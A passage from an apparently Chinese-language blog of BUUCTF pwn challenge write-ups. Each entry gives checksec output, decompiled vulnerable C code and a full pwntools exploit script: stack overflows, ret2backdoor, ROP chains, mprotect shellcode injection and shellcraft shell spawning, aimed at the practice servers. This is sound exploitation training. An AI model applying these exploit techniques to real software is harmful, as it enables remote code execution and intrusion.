c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  var[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  var[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, var);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="number">0x11</span>LL )</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;something wrong! val is %d&quot;</span>, var[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!\n&quot;</span>, var);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try do something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要 <code>*(_QWORD *)&amp;var[13]</code>为0x11则可以getshell</p><h4 id="EXP-8"><a href="#EXP-8" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_n_8&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:27126&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = p32(<span class="number">0x11</span>) * <span class="number">14</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h3><p>没有Canary和PIE</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  bjdctf_2020_babystack checksec bjdctf_2020_babystack</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/bjdctf_2020_babystack/bjdctf_2020_babystack&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>存在栈溢出和后门函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后门函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006E6 backdoor        proc near</span><br><span class="line">.text:00000000004006E6 ; __unwind &#123;</span><br><span class="line">.text:00000000004006E6                 push    rbp</span><br><span class="line">.text:00000000004006E7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006EA                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004006EF                 call    _system</span><br><span class="line">.text:00000000004006F4                 mov     eax, 1</span><br><span class="line">.text:00000000004006F9                 pop     rbp</span><br><span class="line">.text:00000000004006FA                 retn</span><br></pre></td></tr></table></figure><p>溢出到后门函数即可</p><h4 id="EXP-9"><a href="#EXP-9" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="comment"># p = process(&quot;./bjdctf_2020_babystack&quot;)</span></span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:29795&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sda = p.sendafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x00000000004006E6</span></span><br><span class="line">sla(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>, <span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p64(backdoor_addr)</span><br><span class="line">sda(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h3><p>跟<strong>ciscn_2019_c_1</strong>一毛一样</p><h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>没有Canary， PIE 开启了NX保护</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">➜  not_the_same_3dsctf_2016 checksec not_the_same_3dsctf_2016</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/not_the_same_3dsctf_2016/not_the_same_3dsctf_2016&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>main函数存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);                                     <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在<code>get_secret</code>函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="EXP1-1"><a href="#EXP1-1" class="headerlink" title="EXP1"></a>EXP1</h4><p>将flag存放到<code>.bss</code>段上, 因为存在<code>write</code>可以将flag输出出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">p = process(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:25675&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sda = p.sendafter</span><br><span class="line">ia = p.interactive</span><br><span class="line">elf = ELF(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">fl4g = <span class="number">0x080ECA2D</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x2D</span> + p32(<span class="number">0x080489A0</span>) + p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">1</span>) + p32(fl4g) + p32(<span class="number">42</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h4 id="EXP2-1"><a href="#EXP2-1" class="headerlink" title="EXP2"></a>EXP2</h4><p>虽然开启了NX保护，但是存在<code>mprotect</code>, 则可以修改<code>bss</code>段为可读可写可执行，然后通过<code>read</code>函数往<code>bss</code>写shellcode，最后将执行流返回到<code>bss</code>即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">p = process(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:25675&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sda = p.sendafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">mprotect_addr = elf.sym[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line">read_plt = elf.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">pop_3_ret = <span class="number">0x080483b8</span></span><br><span class="line">m_start = <span class="number">0x080EB000</span>  <span class="comment"># bss  ye</span></span><br><span class="line">bss = <span class="number">0x080EBF80</span>  <span class="comment"># bss</span></span><br><span class="line"><span class="built_in">len</span> = <span class="number">0x2000</span></span><br><span class="line">prot = <span class="number">4</span>+<span class="number">2</span>+<span class="number">1</span>  <span class="comment"># (rwx)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x2D</span>+p32(mprotect_addr)+p32(pop_3_ret) + \</span><br><span class="line">    p32(m_start)+p32(<span class="built_in">len</span>)+p32(prot)  <span class="comment"># mprotect(m_start,len,7);</span></span><br><span class="line">payload += p32(read_plt)+p32(bss+<span class="number">0x400</span>)+p32(<span class="number">0</span>) + \</span><br><span class="line">    p32(bss+<span class="number">0x400</span>)+p32(<span class="number">0x100</span>)  <span class="comment"># read(0,m_start,100)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = asm(shellcraft.sh(), arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)  <span class="comment"># shellcode len is 40</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h3><p>没有Canary和PIE, 开启NX</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  [HarekazeCTF2019]baby_rop checksec babyrop</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/[HarekazeCTF2019]baby_rop/babyrop&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>main函数存在栈溢出漏洞，程序中存在<code>system</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并存在<code>/bin/sh</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211030174558263.png" alt="image-20211030174558263"></p><p>根据64位传参规则，需要找一个<code>pop rdi; ret;</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211030174840049.png" alt="image-20211030174840049"></p><h4 id="EXP-10"><a href="#EXP-10" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyrop&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:26360&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sda = p.sendafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./babyrop&quot;</span>)</span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000400683</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0000000000601048</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;What&#x27;s your name?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h3><p>没有Canary、PIE，开启NX</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  jarvisoj_level2_x64 checksec level2_x64</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/jarvisoj_level2_x64/level2_x64&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>漏洞点在下面的函数中, 栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在<code>/bin/sh</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211030183852299.png" alt="image-20211030183852299"></p><p>根据64位传参规则，需要一个<code>rdi</code>的<code>gadget</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="buuctf.assets/image-20211030184223526.png" alt="image-20211030184223526"></p><h4 id="EXP-11"><a href="#EXP-11" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./level2_x64&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:27905&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./level2_x64&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_addr = <span class="number">0x00000000004006b3</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0000000000600A90</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">128</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sla(<span class="string">&quot;Input:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_n_5  checksec ciscn_2019_n_5</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/ciscn_2019_n_5/ciscn_2019_n_5&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>main存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="EXP-12"><a href="#EXP-12" class="headerlink" title="EXP"></a>EXP</h4><p>name在<code>.bss</code>段上, 由于保护没开，故可以往上面写shellcode，跳过去执行即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_n_5&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:28493&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">sla(<span class="string">&quot;tell me your name&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">40</span> + p64(<span class="number">0x0000000000601080</span>)</span><br><span class="line">sla(<span class="string">&quot;What do you want to say to me?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h3><p>开启 NX, PIE , 没有 Canary</p><figure class="highlight 